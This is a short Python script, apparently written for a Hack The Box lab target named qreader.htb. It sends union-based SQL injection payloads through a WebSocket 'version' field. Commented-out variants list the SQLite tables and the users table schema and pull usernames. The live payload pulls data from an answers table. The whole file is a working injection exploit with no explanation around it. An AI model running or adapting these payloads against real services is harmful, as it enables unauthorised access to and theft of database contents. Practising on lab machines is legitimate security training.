from websocket import create_connection
import sys, json

ws_host = 'ws://qreader.htb:5789'

###VERSION = {"version":"0.0.3\" union select group_concat(tbl_name),2,3,4 FROM sqlite_master WHERE type=\"table\" and tbl_name NOT like \"sqlite_%\" -- -"}
###VERSION = {"version":"0.0.3\" union select group_concat(sql),2,3,4 FROM sqlite_master WHERE type!=\"meta\" AND sql NOT NULL AND name =\"users\"-- -"}
###VERSION = {"version":"0.0.3\" union select 1,group_concat(username),3,4 from users-- -"}

###VERSION = {"version":"0.0.3\" union select group_concat(tbl_name),2,3,4 FROM sqlite_master WHERE type=\"table\" and tbl_name NOT like \"sqlite_%\" -- -"}
###VERSION = {"version":"0.0.3\" union select group_concat(sql),2,3,4 FROM sqlite_master WHERE type!=\"meta\" AND sql NOT NULL AND name =\"answers\"-- -"}
VERSION = {"version":"0.0.3\" union select 1,group_concat(answered_by),3,4 from answers-- -"}

ws = create_connection(ws_host + '/version')
ws.send(json.dumps({'version': VERSION}))
result = ws.recv()
print(result)
ws.close()
